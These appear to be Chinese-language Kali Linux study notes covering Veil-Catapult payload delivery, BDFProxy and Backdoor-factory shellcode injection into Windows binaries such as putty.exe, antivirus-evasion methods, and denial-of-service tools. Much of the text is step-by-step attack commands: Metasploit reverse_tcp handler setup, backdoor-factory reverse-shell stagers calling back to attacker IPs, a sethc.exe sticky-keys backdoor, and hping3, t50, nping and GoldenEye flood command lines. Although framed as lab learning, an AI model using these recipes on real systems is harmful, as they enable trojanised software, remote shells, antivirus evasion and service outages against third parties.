字数统计: 527 字 | 阅读时长 ≈ 2 分钟

1. Veil-catapult

  • Payload的投递
    • 集成veil-evasion生成免杀payload或自定义payload
    • 使用Impacket上传二进制payload文件（前提需要有一个账号密码）
    • 使用passing-the-hass出发执行payload
  • Payload直接在内存中运行（类似于SMBexec）
    • 不向硬盘写入payload文件，避免文件型病毒查杀软件
  • ▲ 2020.2.17 依赖Veil-catapult
  • ▲ Github地址：https://github.com/Veil-Framework/Veil-Catapult

2. 实验

  • Kali
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Window 7（需要有powershell）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
    • 🔺命令：ifconfig查看网络连接，关闭防火墙
    • 🔺命令：cmd → powershell尝试能否开启powershell
    • 抓包查看是否有数据到本地电脑
  • Kali
    • 🔺命令：vi /etc/veil/settings.py → SPAWN_CATAPULT_HANDLER=”true”（默认情况下是投放完payload不开启msf，对EXE delivery起作用，对Standalone payloads不起作用）
    • 🔺命令：msfconsole
      • 🔺命令：use exploit/multi/handler/（使用控制台）
      • 🔺命令：show options
      • 🔺命令：set payload windows/meterpreter/reverse_tcp（设置payload）
      • 🔺命令：show options
      • 🔺命令：set lhost 本机的IP（监听IP）
      • 🔺命令：set lport 4444（监听端口4444）
      • 🔺命令：set EXITFUNC thread（以线程的方式执行）
      • 🔺命令：show options
      • 🔺命令：exploit（执行）
      • 🔺命令：session -l（查看session）
      • 🔺命令：session -i 1（选择的session1）→ 🔺命令：getuid/getpid
    • veil-catapult
      • Standalone payloads
      • EXE delivery
    • Standalone payloads

      • ⭐Barebones python injector（同Powershell injector相同原理，适用于Powershell injector注入失败情况下）
      • ⭐Sethc backdoor（用cmd.exe替换C:\Windows\System32\sethc.exe，Sethc为连按shift五次的粘滞键程序，一般可通过物理接触）

1. Bdfproxy

  • Bdfproxy(mitmproxy)
    • 基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）
  • 补充内容
    • 全站HTTPS防注入（微软每个补丁都带马）
    • PE文件证书签名可被清除
    • PE Header -> Optional Header -> Certificate Table（Address and size）
      • 全部用0覆盖
      • BDF默认清除数字签名
  • https://live.sysinternals.com/
  • ▲ 2020.2.15 BDFProxy已不再受支持
  • ▲ 2020.2.15 BDFProxy的链接https://github.com/secretsquirrel/BDFProxy.git

Kali Linux笔记(九十三)：Backdoor-factory

1. Backdoor-factory

  • ▲ 2020.2.15 Backdoor-factory已不再受支持
  • ▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行
  • ▲ 2020.2.15 Backdoor-factory链接https://github.com/secretsquirrel/the-backdoor-factory.git
  • Patch
    • 通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法
    • BDF：向二进制文件中增加或者删除代码内容
      • 某些受保护的二进制程序无法patch
      • 存在一定概率文件会被patch坏掉
  • 后门工厂
    • 适用于windows PE x32/x64和Linux ELF x32/x64（OSX）
    • 支持msf payload、自定义payload
  • 将shellcode代码patch进模板文件，躲避AV检查
  • Python语言编写
  • msf使用的patch方法
    • 覆盖程序入口
      • 🔺命令：msfvenom -p windows/shell/reverse_tcp ……
    • 创建新的线程执行shellcode并跳回源程序入口
      • 🔺命令：msfvenom -p windows/shell/reverse_tcp –k
      • 增加代码片段跳转执行后跳回源程序入口

  • CTP方法
    • 增加新的代码段section，与msf -k方法类似
    • 使用现有的代码裂缝/洞（code cave）存放shellcode
      • 二进制文件中超过两个字节的连续x00区域（代码片段间区域）
      • 根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同
    • Kali
      • 🔺命令：cp which cat
      • 🔺命令：hexeditor cat

  • 单个代码洞大小不足以存放完整的shellcode
    • 多代码洞跳转（非顺序执行）
      • 初期免杀率可达100%
    • 结合msf的stager方法
  • Path选项
    • 附加代码段
    • 单代码洞注入
    • 多代码洞注入

2. BDF的使用

  • 参数
    • -S（检测文件是否支持注入）
    • -l（可限定字节数的代码洞）
    • -H（指定IP地址）
    • -J（指定端口）
  • 检查二进制文件是否支持代码注入（可使用putty）
    • 🔺命令：backdoor-factory -f putty.exe –S
  • 查看cave大小
    • 🔺命令：backdoor-factory -f putty.exe -c
  • 显示可用payload
    • 🔺命令：backdoor-factory -f putty.exe -s show
    • iat_reverse_tcp_stager_threaded（分步骤反弹shell的tcp连接）
  • 免杀效果对比（注入文件大小会发生改变）
    • 🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666（单一代码洞注入）
    • 🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J（多代码洞注入）
    • 🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666（附加注入）
  • 验证有效性
    • Kali
      • 🔺命令：msfconsole
      • 🔺命令：use exploit/multi/handler
      • 🔺命令：set payload windows/meterpreter/reverse_tcp
      • 🔺命令：show options
      • 🔺命令：set LHOST Kali的IP
      • 🔺命令：set LPORT Kali的IP
      • 🔺命令：exploit -j
    • 物理主机
      • 双击putty.exe看是否能正常执行
      • 查看shell的免杀效果（查杀网站）
    • Kali
      • 看是否能连接上shell
      • 🔺命令：shell
      • 🔺命令：ipconfig
  • 与veil-evasion集成
  • IAT——import address table
    • 指针指向WinAPI地址，被称为thunks（形实转换程序），地址预定义

1. 恶意软件

  • 病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序
  • 在用户非自愿的情况下执行安装
  • 出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…

2. 防病毒软件

  • 恶意程序最主要的防护手段
    • 杀毒软件/防病毒软件
    • 客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）
  • 检测原理
    • 基于二进制文件中特征签名的黑名单检测方法（病毒特征库）
    • 基于行为的分析方法（启发式）
  • 事后手段
    • 永远落后于病毒发展

3. 免杀技术

  • 修改二进制文件中的特征字符
    • 替换、擦除、修改
  • 加密技术（crypter）
    • 通过加密使得特征字符不可读，从而逃避AV检测
    • 运行时分片分段的解密执行，注入进程或AV不检查的无害文件中
  • 防病毒软件的检测
    • 恶意程序本身的特征字符
    • 加密器crypter的特征字符

4. 当前现状

  • 恶意软件制造者
    • 编写私有RAT软件，避免普遍被AV所知的特征字符
    • 使用独有crypter软件加密恶意程序
    • 处事低调，尽量避免被发现
    • 没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀
    • Fully UnDetectable是最高追求（FUD）
  • AV厂商
    • 广泛采集样本，尽快发现新出现的恶意程序，更新病毒库
    • 一般新的恶意软件安全UD窗口期是一周左右
    • 与恶意软件制造者永无休止的拉锯战
    • 新的启发式检测技术尚有待完善（误杀露杀）
  • 单一AV厂商的病毒库很难达到100%覆盖
    • https://www.virustotal.com/
      • 接口被某些国家的AV软件免费利用，没有自己的病毒库

1. 拒绝服务攻击工具

  • RUDY
    • 慢速应用层HTTP POST攻击，与slowhttptest原理相同
    • ▲ 与slowhttptest的区别：每次只传输一个字节的数据
    • ▲ 攻击有表单WEB页面，攻击时需指定攻击的参数名称
    • 美剧”黑客军团”中曾提到此攻击手段
    • http://sourceforge.net/projects/r-u-dead-yet/
  • Hping3
    • 几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试
    • 参数
      • -c（建立的连接数）
      • -d（发送的数据包要有多大）
      • -S（Syn Flood攻击）
      • -w（window大小，默认为64字节）
      • -p（目标端口）
      • –rand-source（随机产生源地址）
      • -P/-U（TCP标记位PSH/URG）
      • -q（不显示攻击结果）
      • -a（伪造源地址）
      • -n（不解析域名）
      • -s（指定源端口）
    • Syn Flood攻击
      • 🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood –rand-source 1.1.1.1
      • 🔺命令：hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1
    • TCP Flood攻击
      • 🔺命令：hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1
    • ICMP Flood攻击
      • 🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2
    • UDP Flood攻击
      • 🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2
    • LAND攻击
      • 特殊种类的SYN FLood攻击
      • 源地址、目的地址都是受害者，受害者于自己完成三次握手
      • 🔺命令：hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1
  • nping
    • TCP全链接DoS攻击
      • 🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1
    • 查公网IP
      • 🔺命令：nping --echo-client "public" echo.nmap.org --udp
  • Siege
    • http/https压力测试工具，模拟多个用户并发访问请求
    • 🔺命令：siege -g http://1.1.1.1/a.php / 1.1.1.1
    • 🔺命令：siege -i -c 1000
    • 🔺命令：siege -i -c 1000 http://1.1.1.1/a.php -A siegehttp
    • 同时攻击多个url，使用-f调用字典文件
      • /etc/siege/urls.txt
  • T50网络压力测试
    • ▲ t50 -h（t50命令详细）
    • 🔺命令：t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80
    • 🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22
  • Nmap
    • 🔺命令：grep dos /usr/share/nmap/scripts/script.db | cut -d "\"" -f 2
    • 🔺命令：cat /usr/share/nmap/scripts/script.db

3. 其他拒绝服务工具

  • XOIC
    • 攻击任意IP地址的指定端口
    • 🔺命令：git clone git://git.code.sf.net/p/xoic/code xoic-code
    • https://xoicdoser.wordpress.com/
    • 三种模式：test、normal、DoS Attack
    • 支持协议：TCP/HTTP/UDP/ICMP
    • ▲ 数据包难以找到/软件包带有恶意软件
  • HULK–Http Unbearable Load King
    • Python脚本
    • 随机产生大量唯一的地址请求，避免缓存命中（▲ 对企业有nginx等反向代理软件）
    • 耗尽WEB服务器资源池
    • https://packetstormsecurity.com/files/download/112856/hulk.zip
  • DDoSIM
    • 7层拒绝服务工具（模拟多个僵尸机）
    • 随机IP地址
    • 基于TCP连接的攻击
    • 应用层DDoS攻击
    • 正常的HTTP请求、非正常的HTTP请求式DDoS
    • SMTP DDoS
    • 随机端口的TCP连接洪水
    • ▲ 数据包难以找到/软件包带有恶意软件
    • ▲ 2020.2.13 找到此工具后无法编译
  • GoldenEye
    • http/https拒绝服务攻击工具
    • 安全研究位目的的Python脚本
    • 随机攻击向量，keep-alive，避免缓存命中
    • 🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip
    • 🔺命令：unzip master.zip
    • 🔺命令：./goldeneye.py -h（▲ 查看goldeneye选项）
    • 🔺命令：./goldeneye.py http://1.1.1.1 -w 50
    • ▲ -w（僵尸机）
    • ▲ 2020.2.13 此工具运行后抓包无发生数据
